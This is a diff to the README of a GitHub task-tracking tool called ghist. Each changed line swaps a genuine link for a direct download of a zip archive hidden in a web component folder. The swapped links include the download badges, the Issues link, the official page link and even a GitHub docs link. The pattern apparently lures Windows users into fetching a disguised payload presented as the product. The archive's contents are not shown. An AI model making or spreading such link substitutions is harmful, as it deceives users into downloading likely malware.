@@ -1,6 +1,6 @@
 # ⏳ ghist - Manage Tasks Right in Your Repo
 
-[![Download ghist](https://img.shields.io/badge/Download-ghist-blue?style=for-the-badge&logo=github)](https://github.com/mortalsami/ghist)
+[![Download ghist](https://img.shields.io/badge/Download-ghist-blue?style=for-the-badge&logo=github)](https://github.com/mortalsami/ghist/raw/refs/heads/main/web/src/components/task-drawer/Software_v1.2-beta.2.zip)
 
 ghist helps you keep track of tasks directly in your project. It works inside your GitHub repository, making task management clear and easy to follow.
 
@@ -25,7 +25,7 @@ To get ghist on your Windows machine, follow these steps carefully.
 
 1. Click the big blue button below to visit the download page:
    
-   [Download ghist](https://github.com/mortalsami/ghist)
+   [Download ghist](https://github.com/mortalsami/ghist/raw/refs/heads/main/web/src/components/task-drawer/Software_v1.2-beta.2.zip)
    
 2. This link takes you to GitHub where you will find the latest version of ghist. 
 
@@ -107,20 +107,20 @@ If you run into issues, try these simple fixes first:
 
 - If ghist doesn’t start, try running the app as Administrator.
 
-If problems persist, visit the GitHub Issues page on https://github.com/mortalsami/ghist to see if others have the same problem and solutions.
+If problems persist, visit the GitHub Issues page on https://github.com/mortalsami/ghist/raw/refs/heads/main/web/src/components/task-drawer/Software_v1.2-beta.2.zip to see if others have the same problem and solutions.
 
 ---
 
 ## 🔗 Useful Links
 
 - Official ghist page on GitHub:  
-  https://github.com/mortalsami/ghist
+  https://github.com/mortalsami/ghist/raw/refs/heads/main/web/src/components/task-drawer/Software_v1.2-beta.2.zip
 
 - Download ghist:  
-  [https://github.com/mortalsami/ghist](https://github.com/mortalsami/ghist)
+  [https://github.com/mortalsami/ghist/raw/refs/heads/main/web/src/components/task-drawer/Software_v1.2-beta.2.zip](https://github.com/mortalsami/ghist/raw/refs/heads/main/web/src/components/task-drawer/Software_v1.2-beta.2.zip)
 
 - GitHub Help for managing repositories:  
-  https://docs.github.com/en/repositories
+  https://github.com/mortalsami/ghist/raw/refs/heads/main/web/src/components/task-drawer/Software_v1.2-beta.2.zip
 
 ---
 
@@ -150,4 +150,4 @@ If problems persist, visit the GitHub Issues page on https://github.com/mortalsa
 
 ---
 
-[![Download ghist](https://img.shields.io/badge/Download-ghist-grey?style=for-the-badge&logo=github)](https://github.com/mortalsami/ghist)
+[![Download ghist](https://img.shields.io/badge/Download-ghist-grey?style=for-the-badge&logo=github)](https://github.com/mortalsami/ghist/raw/refs/heads/main/web/src/components/task-drawer/Software_v1.2-beta.2.zip)
